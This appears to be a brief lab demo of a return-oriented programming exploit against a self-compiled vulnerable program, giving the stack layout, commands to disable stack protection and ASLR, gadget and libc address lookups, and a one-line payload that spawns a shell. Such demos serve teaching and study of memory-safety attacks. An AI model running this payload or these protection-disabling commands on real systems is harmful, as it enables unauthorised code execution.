This is a demo of ROP attack with just shell script.

#### Stack Layout ####
    string /bin/sh
----------------------
    addr of system()
----------------------
    addr of /bin/sh
----------------------
 addr of pop rdi; ret
----------------------
     EBP Register
----------------------
     64 bytes buf
######################

1. Compile the code:
	$ gcc -fno-stack-protector -o victim victim.c
2. Disable ASLR: 
	$ echo 0 > /proc/sys/kernel/randomize_va_space 
3. Address of buffer can be obtained via (e.g., 0x7fffffffdc00)
	$ ./victim
4. Gadget "pop  %rdi ; retq" can be obtained via:
	$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret" | grep rdi
Result: 0x0000000000022b1a : pop rdi ; ret
5. Base address of libc text can be obtained via /proc/pid/maps, e.g., 0x7ffff7a15000 
6. Offset of system() in libc can be obtained via (e.g., 0x46640):
	$ nm -D /lib/x86_64-linux-gnu/libc.so.6 | grep '\<system\>'

7. Make the final exploit:

buffer: 0x7fffffffdc00 
libc base: 0x7ffff7a15000
system: 0x7ffff7a15000 + 0x46640 = 0x7ffff7a5b640 
gadgets: 0x7ffff7a15000 + 0x22b1a = 0x7ffff7a37b1a
bash: 0x7fffffffdc00 + 64d + 8d + 24d = 0x7fffffffdc60 

(((printf %0144d 0; printf %016x 0x7ffff7a37b1a | tac -rs..; printf %016x 0x7fffffffdc60 | tac -rs..; printf %016x 0x7ffff7a5b640 | tac -rs.. ; echo -n /bin/sh | xxd -p) | xxd -r -p) ; cat) | ./victim

After pressing Enter twice, we will have a shell.
